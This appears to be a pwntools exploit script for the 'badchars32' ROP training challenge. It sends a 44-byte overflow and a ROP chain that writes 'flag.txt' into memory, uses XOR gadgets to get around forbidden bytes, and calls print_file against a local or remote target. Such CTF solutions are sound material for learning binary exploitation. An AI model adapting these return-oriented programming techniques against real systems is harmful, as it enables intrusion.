#!/usr/bin/python3

#!/usr/bin/python
#coding=utf-8
#__author__:TaQini

from pwn import *


local_file  = './badchars32'
local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = local_libc # '../libc.so.6'

is_local = False
is_remote = False

if len(sys.argv) == 1:
    is_local = True
    p = process(local_file)
    libc = ELF(local_libc)
elif len(sys.argv) > 1:
    is_remote = True
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    else:
        host, port = sys.argv[1].split(':')
    p = remote(host, port)
    libc = ELF(remote_libc)

elf = ELF(local_file)

context.log_level = 'debug'
context.arch = elf.arch

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))

def debug(cmd=''):
    if is_local: gdb.attach(p,cmd)

elf.checksec()
# info
printfile=p32(0x080483d0)


#4   0x080483d0 GLOBAL FUNC       print_file
#debug('b main')


popret=p32(0x080485b9)
movret=p32(0x0804854f)
xorret=p32(0x08048547)
popebx=p32(0x0804839d)
popebp=p32(0x080485bb)
#0x0804854f : mov dword ptr [edi], esi ; ret
#0xf7fd4c27 : pop esi ; pop edi ; ret
'''(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0xf7fd4c27 in ?? ()
'''
#0x080485b9 : pop esi ; pop edi ; pop ebp ; ret
#0x08048547: xor byte ptr [ebp], bl; ret; 
#0x0804839d : pop ebx ; ret
#0x08048713 : xor byte ptr [ebp + 0xe], cl ; and byte ptr [edi + 0xe], al ; adc al, 0x41 ; ret
#0x080485bb : pop ebp ; ret


#print_file参数是一个地址，所以不能用字符串
#args
#24  0x00001018    0x8 0x0804a018    0x8 -rw- .data
dataaddress=p32(0x0804a018)
data1=b'flag'
data2=b'.txt'

# rop1s
gadget=popret+data1 + dataaddress+p32(0x0804a018+0x2)+movret
#gadget+=popebx+p32(0x8a8a8a8a)+xorret
gadget+=popebx+p32(0x8a)+xorret  #8a 00 00 00

gadget+=popret+data2+ p32(0x0804a018+0x4)+p32(0x0804a018+0x3)+movret
gadget+=popebx+p32(0x8c8c8c8c)+xorret

#修改
gadget+=popebx+p32(0xc5c5c5c5)+popebp+p32(0x0804a018+0x4)+xorret
gadget+=popebx+p32(0x93939393)+popebp+p32(0x0804a018+0x4+0x2)+xorret


gadget+=printfile+b'a'*4+dataaddress
offset = 44
payload = b'A'*offset
#elf.p8(elf.bss()+0x100,data)
payload += gadget

# debug()
sl(payload)
p.interactive()



#system()地址 + 命令字符串地址
